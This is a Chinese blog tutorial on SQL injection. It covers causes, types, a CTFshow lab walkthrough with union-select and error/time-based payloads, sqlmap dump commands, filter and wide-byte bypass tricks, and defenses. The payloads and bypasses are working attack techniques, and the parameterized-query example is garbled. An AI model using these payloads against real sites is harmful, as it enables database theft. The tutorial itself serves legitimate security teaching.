#  第2期：Web漏洞挖掘实战｜SQL注入底层原理与全场景挖掘技巧  
原创 龙哥网络安全
                    龙哥网络安全  龙哥网络安全   2026-02-05 02:23  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/7O8nPRxfRT4enib1kuPYgTOrfibWorjGvjAwOkbCaicKTnek32AxrMTRfuohYry6YBMq8nys0SY2oqGq2Odvn5ORg/640?wx_fmt=jpeg "")  
  
  
前言  
  
SQL注入是Web漏洞中最常见、危害最大的漏洞之一，也是新手入门Web漏洞挖掘的首选场景。无论是CTF竞赛，还是实战安全测试，SQL注入都频繁出现——其核心成因是用户输入未被过滤，直接拼接进入SQL语句，导致SQL语句被恶意篡改。   
  
本文将从底层原理出发，拆解SQL注入的成因、分类、挖掘流程，结合CTFshow靶场实战，覆盖手动注入、工具自动化挖掘、过滤绕过技巧，同时补充防护方案，兼顾挖掘能力与防护思维，适合Web安全新手、CTF爱好者阅读，需具备基础的MySQL语法与HTTP协议知识。  
## 一、SQL注入底层成因拆解  
  
SQL注入的本质是输入可控+代码未过滤，底层核心是SQL语句拼接漏洞，我们通过一个简单的代码示例，理解其成因：  
1. 漏洞代码示例（PHP）  
  
```
<?php// 接收用户输入的ID参数$id = $_GET['id'];// 连接数据库$conn = mysqli_connect("localhost", "root", "123456", "test");// 拼接SQL语句（未过滤用户输入）$sql = "SELECT * FROM user WHERE id = " . $id;// 执行SQL语句并返回结果$result = mysqli_query($conn, $sql);// 输出结果while ($row = mysqli_fetch_assoc($result)) {   echo "用户名：" . $row['username'] . "<br/>";}?>
```  
1. 注入触发过程 当用户输入正常参数（id=1）时，拼接后的SQL语句为：  
  
```
SELECT * FROM user WHERE id = 1
```  
  
语句正常执行，返回id=1的用户数据；当用户输入恶意参数（id=1 OR 1=1）时，拼接后的SQL语句为：  
```
SELECT * FROM user WHERE id = 1 OR 1=1
```  
  
由于1=1恒成立，语句会返回所有用户数据，触发SQL注入漏洞。  
1. 核心成因总结  
  
SQL注入的出现，本质是开发者忽视了用户输入的不可信性，未对输入进行严格过滤，导致恶意输入被当作SQL语句的一部分执行。其核心触发条件有两个：  
- 输入可控：用户可以控制传入SQL语句的参数（如URL参数、表单参数、Cookie）。  
  
- 未做过滤：开发者未对用户输入的特殊字符（单引号、双引号、OR、AND、注释符等）进行过滤或转义。  
  
## 二、SQL注入的核心分类（按触发场景）  
  
根据触发场景与数据交互方式，SQL注入可分为4类，不同类型的挖掘思路与利用方法略有差异，新手需重点掌握前3类。  
1. 基于报错的SQL注入  
  
- 核心特征：注入恶意参数后，页面会返回数据库报错信息（如MySQL的语法错误、Oracle的权限错误），可通过报错信息获取数据库结构。  
  
- 触发条件：程序开启了数据库报错显示（如PHP的display_errors=On）。  
  
- 常用payload：' and extractvalue(1,concat(0x7e,database(),0x7e))--+（MySQL）。  
  
1. 基于布尔的盲注  
  
- 核心特征：注入恶意参数后，页面无报错信息，但会根据SQL语句的执行结果返回不同内容（如正常显示/空白显示、登录成功/失败）。  
  
- 触发条件：程序未显示数据库报错，仅返回执行结果的布尔值（真/假）。  
  
- 挖掘思路：通过构造布尔表达式（如OR 1=1、OR 1=2），逐字符猜解数据库信息，效率较低，需借助工具自动化。  
  
1. 基于时间的盲注  
  
- 核心特征：注入恶意参数后，页面无报错、无内容差异，但会根据SQL语句的执行结果延迟响应（如sleep(5)，页面延迟5秒加载）。  
  
- 触发条件：程序未显示任何执行结果，仅能通过响应时间判断SQL语句是否执行。  
  
- 常用payload：' and sleep(5)--+（MySQL）  
，若页面延迟5秒加载，说明存在注入。  
  
1. 堆叠注入  
  
- 核心特征：通过分号（;）分隔SQL语句，执行多个SQL语句（如查询+删除、查询+插入）。  
  
- 触发条件：程序支持执行多个SQL语句（如PHP的mysqli_multi_query函数）。  
  
- 风险等级：极高，可直接执行增删改查操作，甚至删除数据库。  
  
## 三、SQL注入标准化挖掘流程（靶场实战同步）  
  
本文以CTFshow Web入门第1题（SQL注入）为例，拆解信息收集→漏洞探测→漏洞利用→漏洞验证的完整流程，新手可跟着实操。  
1. 信息收集（前置步骤）  
  
- 目标信息：靶场地址（如http://xxx.ctfshow.com/?id=1），URL参数id可控。  
  
- 数据库类型探测：通过构造特殊参数（如id=1'）  
，观察页面报错信息，确认数据库为MySQL。  
  
- 参数类型判断：输入id=1 and 1=1  
（数字型），页面正常显示；输入id=1' and 1=1--+  
（字符型），页面报错，说明为数字型注入。  
  
1. 漏洞探测（核心步骤）  
  
漏洞探测的核心是“确认是否存在注入点”，常用两种方式：手动探测与工具探测。  
  
（1）手动探测  
- 步骤1：构造测试参数，判断是否存在注入点：  http://xxx.ctfshow.com/?id=1'  # 页面报错，说明可能存在注入  
  
http://xxx.ctfshow.com/?id=1--+  # 页面正常显示，确认存在注入  
- 步骤2：判断字段数（用于联合查询），使用order by语句：  http://xxx.ctfshow.com/?id=1 order by 3--+  # 正常显示  
  
http://xxx.ctfshow.com/?id=1 order by 4--+  # 报错，说明字段数为3  
- 步骤3：判断显示位（联合查询的结果显示位置），使用union select语句：  http://xxx.ctfshow.com/?id=-1 union select 1,2,3--+  # 页面显示2、3，说明2、3为显示位  
  
（2）工具探测（SQLmap）  
  
对于复杂场景，可使用SQLmap自动化探测，核心命令如下（新手直接复制修改）：  
```
# 探测是否存在SQL注入sqlmap -u "http://xxx.ctfshow.com/?id=1"# 列出所有数据库sqlmap -u "http://xxx.ctfshow.com/?id=1" --dbs# 列出指定数据库（如ctfshow_web）的所有表sqlmap -u "http://xxx.ctfshow.com/?id=1" -D ctfshow_web --tables# 提取指定表（如flag）的所有字段数据sqlmap -u "http://xxx.ctfshow.com/?id=1" -D ctfshow_web -T flag -C flag --dump
```  
  
说明：SQLmap会自动判断注入类型、数据库类型，新手需注意：若目标存在反爬，需添加--cookie参数（携带登录Cookie）。  
1. 漏洞利用（获取核心数据）  
  
这里以手动联合查询为例，获取数据库名、表名、字段名与Flag：  
- 步骤1：获取数据库名：  http://xxx.ctfshow.com/?id=-1 union select 1,database(),3--+  # 数据库名为ctfshow_web  
  
- 步骤2：获取表名（使用information_schema数据库）：  
  
http://xxx.ctfshow.com/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ctfshow_web'--+  # 表名为flag  
  
- 步骤3：获取字段名：  
  
http://xxx.ctfshow.com/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='ctfshow_web' and table_name='flag'--+  # 字段名为flag  
  
- 步骤4：获取Flag：  
  
http://xxx.ctfshow.com/?id=-1 union select 1,flag,3 from ctfshow_web.flag--+  # 得到Flag  
  
1. 漏洞验证与风险评估  
  
- 漏洞验证：通过手动构造payload或SQLmap dump数据，确认可获取数据库核心数据，说明漏洞可被利用。  
  
- 风险评估：该漏洞为高危，可直接窃取数据库核心数据，若数据库中存在用户密码、业务数据，会造成严重的数据泄露。  
  
## 四、常见过滤绕过技巧（实战必备）  
  
实战中，开发者常会对用户输入进行过滤，新手需掌握以下4种常用绕过技巧，应对不同过滤场景。  
1. 注释符绕过  
  
若开发者过滤了--+注释符，可使用其他注释符替代：  
```
# 常用注释符--+  # 标准注释符（MySQL）/* */  # 多行注释符，如 ' /* and 1=1 */#  # 井号注释符（需URL编码为%23），如 ' and 1=1 #
```  
1. 关键字绕过  
  
若开发者过滤了OR、AND、SELECT、UNION等关键字，可使用以下方法绕过：  
- 大小写混淆：如UnIoN、SeLeCt、oR。  
  
- 关键字拼接：如SEL/abc  
/ECT（中间插入注释，绕过过滤）。  
  
- 编码绕过：将关键字进行URL编码、Hex编码，如OR编码为%4F%52。  
  
1. 特殊字符绕过  
  
若开发者过滤了单引号、双引号，可根据注入类型选择绕过方法：  
- 数字型注入：无需单引号，直接构造布尔表达式即可。  
  
- 字符型注入：使用十六进制编码，如将'admin'编码为0x61646D696E，拼接为id=1 and username=0x61646D696E。  
  
1. 宽字节注入绕过  
  
若开发者使用addslashes函数对单引号进行转义（将'转义为'），可使用宽字节注入绕过（适用于MySQL数据库，编码为GBK）：  
```
http://xxx.ctfshow.com/?id=1%df' union select 1,2,3--+
```  
  
原理：%df与转义符\（ASCII码为0x5C）拼接为%df5C，GBK编码中%df5C是一个合法汉字，从而绕过转义，使单引号生效。  
## 五、SQL注入防护方案（实战延伸）  
  
挖掘漏洞的同时，需掌握防护思路，形成“攻防兼备”的能力，SQL注入的核心防护方案有3种：  
1. 输入过滤与转义：对用户输入的特殊字符（单引号、双引号、OR、AND等）进行过滤或转义，推荐使用编程语言自带的过滤函数（如PHP的mysqli_real_escape_string）；  
  
1. 参数化查询（预处理语句）：这是最有效的防护方案，将SQL语句与用户输入分离，用户输入仅作为参数传递，无法篡改SQL语句结构，示例（PHP）：  
  
$sql = "SELECT * FROM user WHERE id = ?";  
  
  
conn, $sql);  
  
mysqli_stmt_bind_param(  
id);  # i表示参数为整数  
  
mysqli_stmt_execute($stmt);  
1. 权限控制：给数据库账号分配最小权限，例如查询账号仅授予select权限，禁止授予drop、delete等高危权限，即使出现注入，也能降低危害。  
  
## 六、新手避坑指南（核心4点）  
- 避坑1：混淆注入类型，盲目构造payload。需先判断是数字型还是字符型注入，再构造对应的payload，否则会导致注入失败。  
  
- 避坑2：过度依赖SQLmap，忽视手动注入。实战中部分场景会限制工具访问（如反爬、WAF），手动注入是必备能力。  
  
- 避坑3：未判断字段数与显示位，直接使用联合查询。字段数不匹配会导致SQL语句报错，无法执行。  
  
- 避坑4：忽略WAF防护。实战中很多目标会部署WAF，需先探测WAF类型，再选择对应的绕过方法（如分段注入、编码注入）。  
  
## 七、总结与下期预告  
  
本文拆解了SQL注入的底层成因、核心分类、标准化挖掘流程与过滤绕过技巧，结合CTFshow靶场完成了实战实操，核心要点是理解SQL语句拼接漏洞，掌握手动注入与工具注入的结合方法。SQL注入的挖掘核心不是背诵payload，而是理解底层逻辑，才能应对不同场景的过滤与防护。  
  
下期预告：将聚焦Web漏洞挖掘的另一大高频场景——XSS跨站脚本漏洞，拆解其底层渲染原理、分类、挖掘流程与绕过技巧，结合OWASP WebGoat靶场实战，帮大家掌握XSS漏洞的挖掘与防护能力，敬请关注！  
  
全是能直接用的干货：点击链接就能拿到！  
  
[有了这个资源，网安技术学不会你找我！](https://mp.weixin.qq.com/s?__biz=MzU3MjczNzA1Ng==&mid=2247499507&idx=1&sn=b3342a568d226df231f7a371f8e5a0d5&scene=21#wechat_redirect)  
  
  
  
想要入行黑客&网络安全的朋友，给大家准备了一份：282G全网最全的网络安全资料包免费领取。  
  
  
关注我，到我公众呺主页发送“学习”或者“黑客”，就能领取到视频教程，我都可以免费分享给大家哦！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/7O8nPRxfRT6lk3oXDrx8qaZiaMDS5XHTATLezRmc0A6yBIw1wmpib4hbgAiaK7CmtV0jMMle98QxC74LPEQhjzqOw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4 "")  
  
从0到进阶的全套网安教程  
  
[有了这个资源，网安技术学不会你找我！](https://mp.weixin.qq.com/s?__biz=MzU3MjczNzA1Ng==&mid=2247499507&idx=1&sn=b3342a568d226df231f7a371f8e5a0d5&scene=21#wechat_redirect)  
  
  
  
可以截图或者直接扫码添加找我拿  
  
**龙哥网络安全**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/7O8nPRxfRT6lk3oXDrx8qaZiaMDS5XHTAUZJyk54VZ9YhKV0EQEpCETOEEibrhIBGbJgGS8o1ZqGweicPrIcMh5LQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5 "")  
  
  
**扫码添加领取**  
  
  
**点击蓝字**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ibxqJibmt337FAiaWRcQtUgyiak5dz81n37puYvXjff5AofqGAkjClzzyg4jcUgDucuKloOlGmF8ibYqYQeNHecpezA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6 "")  
  
**关注我**  
  
[#黑客技术]()  
[#挖漏洞]()  
[#技术分享]()  
[#网络工程师]()  
[#零基础小白学黑客技术]()  
[#信息安全]()  
[#CTF]()  
[#网安技术]()  
[#计算机专业]()  
[#转行网络安全]()  
  
  
  
